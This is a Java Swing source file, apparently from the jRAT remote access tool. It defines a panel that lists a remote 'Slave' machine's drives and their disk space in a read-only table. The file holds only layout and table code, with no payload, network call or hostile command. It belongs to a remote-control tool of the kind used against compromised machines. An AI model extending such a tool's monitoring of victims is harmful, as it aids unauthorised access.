package pro.jrat.ui.panels;


import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.ScrollPaneConstants;
import javax.swing.table.DefaultTableModel;

import pro.jrat.Drive;
import pro.jrat.Slave;
import pro.jrat.ui.renderers.table.DrivesTableRenderer;


@SuppressWarnings("serial")
public class PanelControlDrives extends PanelControlParent {
	
	private JTable table;
	
	public JTable getTable() {
		return table;
	}
	
	public DefaultTableModel getModel() {
		return (DefaultTableModel) table.getModel();
	}

	public PanelControlDrives(Slave sl) {
		super(sl);
		
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE)
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 350, Short.MAX_VALUE)
		);
		
		table = new JTable();
		table.setModel(new DefaultTableModel(
			new Object[][] {
			},
			new String[] {
				"Drive", "Total Space", "Free Space", "Usable Space"
			}
		) {
			public boolean isCellEditable(int i, int i1) {
				return false;
			}
		});
		table.setDefaultRenderer(Object.class, new DrivesTableRenderer());
		table.getColumnModel().getColumn(0).setPreferredWidth(123);
		table.getColumnModel().getColumn(1).setPreferredWidth(177);
		table.getColumnModel().getColumn(2).setPreferredWidth(157);
		table.getColumnModel().getColumn(3).setPreferredWidth(139);
		table.getTableHeader().setReorderingAllowed(false);
		table.setRowHeight(25);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);
		
		load();
	}
	
	public void load() {
		while (getModel().getRowCount() > 0) {
			getModel().removeRow(0);
		}
		for (Drive drive : slave.getDrives()) {
			getModel().addRow(new Object[] { drive.getName(), drive.getTotalSpace() + " GB", drive.getFreeSpace() + " GB", drive.getUsableSpace() + " GB" });
		}
	}
}
